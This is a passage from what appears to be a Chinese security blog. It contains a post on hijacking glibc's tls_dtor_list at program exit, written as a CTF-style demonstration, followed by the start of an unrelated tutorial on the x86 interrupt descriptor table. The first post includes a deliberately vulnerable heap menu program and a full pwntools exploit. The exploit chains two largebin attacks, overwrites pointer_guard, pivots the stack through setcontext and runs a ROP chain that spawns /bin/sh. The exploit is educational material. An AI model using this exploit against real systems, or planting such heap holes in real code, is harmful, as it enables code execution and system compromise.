class="number">0x468</span>], <span class="number">1</span></span><br><span class="line">&lt;__call_tls_dtors+<span class="number">76</span>&gt;    mov    rdi, rbp</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">79</span>&gt;    call   <span class="built_in">free</span>@plt                    &lt;<span class="built_in">free</span>@plt&gt;</span><br></pre></td></tr></table></figure></div>
<p>先是会把rbp指向<code>tls_dtor_list</code>，也就是<code>dtor_list</code>链表的头节点，正是我们修改的地方。然后取出func字段后，会先右移0x11位，再与<code>fs:[0x30]</code>处的内容异或。最后call进行调用。那么我们传func字段时就先异或再左移，就能够解出正确的函数指针。需要注意的是，如果我们不是直接利用头节点处的<code>dtor_list</code>，map域也要进行伪造，使<code>map+0x468</code>为一个可写地址，而且之后的<code>free</code>也需要想办法绕过，所以最好还是直接一次直接利用完成。因为这里<code>mov rdx, qword ptr [rbp + 0x18]</code>直接把rdx拉到我们可控的堆区域了，而且我们控制next域就可以控制rdx的值，其实我们也可以走<code>setcontext</code>的打法。</p>
<h4 id="利用验证">利用验证</h4>
<p>自己写一个堆的菜单题，不做什么限制方便原理验证。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *chunk_list[<span class="number">32</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;choice &gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx, size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    chunk_list[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx,size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,chunk_list[idx], size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(chunk_list[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">end</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="type">void</span> *libc_base = &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;puts_addr:%p\n&quot;,&amp;puts);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_base:%p\n&quot;</span>, libc_base);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            delete ();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            edit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            end();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>首先泄露libc基址和heap基址，这里libc基址我直接在主程序中打印出来了，其实也可以通过<code>show largebin</code>来获得。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x428</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)  <span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x16b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123022279.png"
                      class=""
                >
<p>然后free掉一个和0x430那个larginbin属于一个大小范围的，但又比0x430小的chunk3，修改以及在largebin中的那个chunk的bk_nextsize域为<code>target_addr-0x20</code>，然后申请一个大chunk，从topchunk分配，并把chunk3置入largebin，触发largebin
attack，往<code>target_addr</code>写chunk3的地址。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(tls_dtor_list-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>)        <span class="comment">#trigger largebin attack 1</span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123458788.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123536544.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123654313.png"
                      class=""
                >
<p>然后故技重施，再来次largebin
attack改<code>tcbhead_t-&gt;pointer_guard</code>为一个我们知道的堆地址，这里我们可以先把<code>fake_dtor_list-&gt;next</code>改成一个可控的堆区域先，方便后面栈迁移。这里<code>fs_base</code>的地址相对于libc基址是固定的，计算一下就可以得出。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x1af0</span>))    <span class="comment">#next=chunk2-&gt;data</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x4f8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(fs_base+<span class="number">0x30</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x600</span>)        <span class="comment">#trigger largebin attack 2</span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241127183520245.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124109770.png"
                      class=""
                >
<p>这里的key就是我们写到<code>fs:0x30</code>的地址，最后利用chunk2把chunk3（fake_dtor_list）的func域改为加密后的<code>setcontext+61</code>，由于我们之前把next域设置为了chunk2的data域的地址，所以这里rdx就会指向chunk2的data域，这样我们在改chunk2时，设置rsp为一个可写地址，rbp为栈迁移目标地址-8，rcx为<code>leave;ret</code>地址，最终就能栈迁移到我们可控的堆段上，这里我们迁移到了chunk8的data域，chunk8写rop链即可。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line"></span><br><span class="line">key = heap_base + <span class="number">0x3260</span></span><br><span class="line">chunk8 = heap_base + <span class="number">0x3770</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x78</span> + p64(chunk8-<span class="number">8</span>)  <span class="comment">#rbp</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(heap_base+<span class="number">0x5000</span>)+p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x420</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(((setcontext+<span class="number">61</span>)^key)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x428</span>,payload)  </span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(chunk8+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x58</span>,rop)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">end()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124932862.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124955592.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128125025834.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128125109454.png"
                      class=""
                >
<p>exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;pwn.challenge.ctf.show&quot;,28310)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;libc_base:&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x80e50</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">tls_dtor_list = libc_base - <span class="number">0x2918</span></span><br><span class="line">fs_base = libc_base - <span class="number">0x28c0</span></span><br><span class="line"><span class="comment"># fs_base = libc_base - 0x3260</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000004da83</span></span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x428</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)  <span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x16b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(tls_dtor_list-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>)        <span class="comment">#trigger largebin attack 1</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x1af0</span>))    <span class="comment">#next=chunk2-&gt;data</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x4f8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(fs_base+<span class="number">0x30</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x600</span>)        <span class="comment">#trigger largebin attack 2</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line"></span><br><span class="line">key = heap_base + <span class="number">0x3260</span></span><br><span class="line">chunk8 = heap_base + <span class="number">0x3770</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x78</span> + p64(chunk8-<span class="number">8</span>)  <span class="comment">#rbp</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(heap_base+<span class="number">0x5000</span>)+p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x420</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(((setcontext+<span class="number">61</span>)^key)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x428</span>,payload)  </span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(chunk8+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x58</span>,rop)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始搭建自制操作系统——中断管理</title>
    <url>/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>这里我们的目标是实现一个32位的操作系统，所以后面介绍相关的内容默认都是32位下的。</p>
<h3 id="基本概念">基本概念</h3>
<h4 id="idt表">IDT表</h4>
<p><strong>中断描述符表</strong> ( <strong>IDT</strong> ) 用于告知 CPU<a class="link" 
 href="https://wiki.osdev.org/Interrupt_Service_Routines" >中断服务程序<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>(ISR)
的位置（每个中断向量对应一个）。它的结构类似于<a class="link" 
 href="https://wiki.osdev.org/Global_Descriptor_Table" >全局描述符表<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>（GDT）。</p>
<p><strong>IDT</strong>的结构是由 CPU
架构<strong>规范定义的</strong>，所以对于某一类 CPU（比如
x86），<strong>结构是固定的</strong>。IDT 的结构必须符合 CPU
要求，否则中断会失败。但是处理函数里要做什么，是操作系统自己决定的。</p>
<p><strong>IDT</strong> 的位置保存在 <strong>IDTR</strong> （
<strong>IDT</strong> 寄存器）中。它使用 <strong>LIDT</strong>
汇编指令加载，该指令的参数是指向 <strong>IDT
描述符</strong>结构的指针，其结构类似于GDT表的指针的limit和base，其中Offset指的是IDT表的起始地址，而Size为<strong>IDT表</strong>的大小-1：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250504013436605.png"
                      class=""
                >
<p>具体的表结构如下，<strong>IDTR
Offset</strong>即上面我们给IDTR赋值的结构体的<strong>Offset</strong>域，每个表项占8个字节。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250504011956667.png"
                      class=""
                >
<p>其中每一个entry的具体结构如下，<strong>IDT entries</strong>
也称为门。它可以包含中断门、任务门和陷阱门。</p>
<p><strong>Interrupt Gate（中断门）</strong></p>
<ul>
<li>自动清除 IF（中断标志），防止其他中断嵌套进来（常用于硬件中断）</li>
</ul>
<p><strong>Trap Gate（陷阱门）</strong></p>
<ul>
<li>不会清除 IF，适合调试、系统调用等</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250504232852670.png"
                      class=""
                >
<ul>
<li><p><strong>Offset</strong>：指向了ISR（<strong><a class="link" 
 href="https://wiki.osdev.org/Interrupt_Service_Routines" >Interrupt
Service Routine<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong>）入口的起始地址。</p></li>
<li><p><strong>Segment
Selector</strong>：必须指向我们之前定义的<strong>GDT</strong>表中合法的代码段，在中断发生时
CPU
会使用它来<strong>加载代码段（CS寄存器）</strong>，然后跳到指定的中断处理函数。比如我们之前定义的gdt表中第一个段描述符<strong>gdt_code</strong>，那么在中断发生时就会把Segment
Selector设置为0x8。</p></li>
<li><p><strong>Gate Type</strong>：描述了门的类型</p>
<ul>
<li><strong>0x5</strong>：任务门→ 进行任务切换</li>
<li><strong>0x6</strong>：16bit中断门</li>
<li><strong>0x7</strong>：16bit陷阱门</li>
<li><strong>0xE</strong>：32bit中断门（现代常用）</li>
<li><strong>0xF</strong>：32bit陷阱门</li>
</ul></li>
<li><p><strong>DPL</strong>：指定了特权级别，ring0-3</p></li>
<li><p><strong>P</strong>：Present bit，必须设为 <code>1</code>
才会被认为是一个有效的中断门。</p></li>
</ul>
<p>一般系统调用会使用如下<strong>type_attr</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">type_attr = <span class="number">0x8E</span>; <span class="comment">// P=1, DPL=00, Type=1110 (32-bit Interrupt Gate)</span></span><br></pre></td></tr></table></figure></div>
<p>具体的idt代码定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// idt.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDT_ENTRIES 256</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idt_entry</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> offset_low;   <span class="comment">// Offset bits 0-15</span></span><br><span class="line">    <span class="type">uint16_t</span> selector;     <span class="comment">// Kernel segment selector</span></span><br><span class="line">    <span class="type">uint8_t</span>  zero;         <span class="comment">// Always 0</span></span><br><span class="line">    <span 